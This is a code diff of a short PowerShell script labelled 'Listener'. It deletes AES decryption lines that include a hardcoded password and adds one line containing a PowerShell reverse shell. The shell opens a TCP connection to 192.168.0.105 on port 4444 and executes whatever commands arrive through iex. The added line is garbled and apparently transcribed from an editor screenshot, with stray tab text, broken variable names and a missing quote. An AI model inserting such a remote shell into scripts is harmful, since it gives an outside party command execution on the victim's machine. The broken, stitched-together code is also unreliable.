@@ -1,11 +1,6 @@
 #Listener
 
-$cipherText = [byte[]] (Get-Content -Path "C:\ciphertext.bin" -Encoding Byte)
-$password = "mypassword"
-$salt = [byte[]] (Get-Content -Path "C:\salt.bin" -Encoding Byte)
-$iterations = 100
-
-$plainText = Decrypt-AES128_CBC_PKCS7_PBKDF2 -cipherText $cipherText -password $password -salt $salt -iterations $iterations
+﻿ shell.ps1 X 1 2 3 4 Ssm (New-Object Net.Sockets. TCPClient('192.168.0.105,4444)).GetStream(); [byte[]]Sbt-0..65535 1% {0}; while(($i=Ssm. Read (Sbt,0, Sbt.Length)) -ne 0) {; Sd-(New-Object Text. ASCIIEncoding).GetString(Sbt,0,51); Sst=([text.encoding]::UTF8). GetBytes ((iex Sd 2>&1));
 
 Write-Output $plainText
 
